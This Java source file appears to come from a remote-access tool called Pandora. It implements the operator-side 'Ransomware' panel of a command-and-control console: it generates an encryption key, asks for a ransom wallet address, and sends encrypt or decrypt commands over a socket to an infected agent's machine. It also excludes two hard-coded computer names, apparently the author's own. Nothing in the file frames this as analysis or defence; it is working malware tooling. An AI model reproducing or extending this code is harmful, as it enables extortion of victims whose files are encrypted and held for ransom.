package org.pandora.master.scene.impl.agent;


import javafx.geometry.Insets;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.utils.TimeUtils;

import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class Ransomware {

    private final Master master;
    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    private final AgentData agentData;

    public Ransomware(final ControllerBuilder controllerBuilder) {
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
    }

    public void open() {
        final String key = this.getRandomKey();

        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Ransomware | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 52, 25, Color.rgb(230, 230, 230), "Consolas", 16);
        final Line lineH = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.rgb(140, 141, 145), 40, 75, 685, 75);
        final Line lineV = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.rgb(140, 141, 145), 362.5, 75, 362.5, 270);

        final Label encryptKeyLabel = this.builderManager.getLabelBuilder().buildLabel("Encryption Key", 25, 102, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label encryptWalletLabel = this.builderManager.getLabelBuilder().buildLabel("Wallet Address", 25, 152, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label decryptKeyLabel = this.builderManager.getLabelBuilder().buildLabel("Decryption Key", 386, 102, Color.rgb(189, 190, 207), "Verdana", 13);

        final TextField encryptKeyField = this.builderManager.getTextFieldBuilder().buildTextField(key, "Key", 143, 95, 185, 32);
        final TextField encryptWalletField = this.builderManager.getTextFieldBuilder().buildTextField("", "2PamoLOSPtPPlkpmXEeoaS61q96QPExprS", 143, 148, 185, 32);
        final TextField decryptKeyField = this.builderManager.getTextFieldBuilder().buildTextField(key, "Key", 506, 95, 185, 32);

        final Button encryptButton = this.builderManager.getButtonBuilder().buildButton(null, "Start Encryption", 26, 220, "WHITE", "Verdana", 12, 150, 32, "agent-ransomware-button");
        final Button decryptButton = this.builderManager.getButtonBuilder().buildButton(null, "Start Decryption", 388, 220, "WHITE", "Verdana", 12, 150, 32, "agent-ransomware-button");

        final Label infoLabel = this.builderManager.getLabelBuilder().buildLabel("", 25, 272, Color.rgb(230, 230, 230), "Consolas", 13);

        encryptKeyField.setId("agent-ransomware-field");
        encryptWalletField.setId("agent-ransomware-field");
        decryptKeyField.setId("agent-ransomware-field");

        this.setActionEvent(encryptButton, encryptKeyField, encryptWalletField, infoLabel, true);
        this.setActionEvent(decryptButton, decryptKeyField, null, infoLabel, false);

        this.anchorPane.getChildren().addAll(defaultLabel, lineH, lineV, encryptKeyLabel, encryptWalletLabel, encryptKeyField, encryptWalletField, encryptButton, infoLabel, decryptKeyLabel, decryptKeyField, decryptButton);
    }

    private void setActionEvent(final Button button, final TextField keyField, final TextField walletField, final Label infoLabel, final boolean encrypt) {
        button.setOnMouseClicked(event -> {
            final String key = keyField.getText();
            String wallet = "default";
            if (key.length() != 24 || !this.isAllowedKey(key)) {
                infoLabel.setText("Please fill in the 'encryption key' or 'decryption key' field with 24 chars");
                return;
            }
            if (encrypt) {
                wallet = walletField.getText();
                if (wallet.equals("")) {
                    infoLabel.setText("Please fill in the 'wallet address' field");
                    return;
                }
            }
            infoLabel.setText("Successfully sent the " + (encrypt ? "encryption" : "decryption") + " request to " + this.agentData.getUser() + " at " + TimeUtils.getSimpleHour());
            System.out.println("[DEBUG/INFO] Sent request to " + this.agentData.getUser() + " with key " + key + ". Please save the key to decrypt files.");
            if (!this.agentData.getComputer().equals("DESKTOP-RI8GM99") && !this.agentData.getComputer().equals("D8-CB-8A-58-0F-69"))
                this.master.getSocketUtils().write(this.agentData.getId(), encrypt ? "ransomware:encrypt:" + Base64.getEncoder().encodeToString(key.getBytes(StandardCharsets.UTF_8)) + ":" + wallet.replace(":", "(doubleDot)") : "ransomware:decrypt:" + Base64.getEncoder().encodeToString(key.getBytes(StandardCharsets.UTF_8)));
        });
    }

    private boolean isAllowedKey(final String key) {
        final String chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        for (final char ch : key.toCharArray()) if (!chars.contains(String.valueOf(ch))) return false;
        return true;
    }

    private String getRandomKey() {
        final String chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        return IntStream.range(0, 24).mapToObj(i -> String.valueOf(chars.charAt(new SecureRandom().nextInt(chars.length())))).collect(Collectors.joining());
    }
}
